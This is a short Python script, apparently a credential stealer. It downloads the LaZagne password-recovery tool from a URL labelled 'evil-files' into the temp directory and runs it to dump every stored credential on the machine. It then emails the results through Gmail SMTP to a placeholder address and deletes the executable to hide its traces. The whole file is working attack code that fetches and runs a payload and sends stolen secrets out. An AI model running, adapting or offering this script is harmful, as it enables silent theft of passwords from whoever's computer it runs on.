import requests, subprocess, smtplib, os, tempfile

LAZAGNE_DOWNLOAD_URL = "https://localhost:8080/evil-files/laZagne.exe"

def download(url):
    get_res = requests.get(url)
    file_name = url.split("/")[-1]
    
    with open(file_name, "wb") as out_file:
        out_file.write(get_res.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download(LAZAGNE_DOWNLOAD_URL)
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("<YOUR_EMAIL>@gmail.com", "<YOUR_APP_PW>", result)
os.remove("laZagne.exe")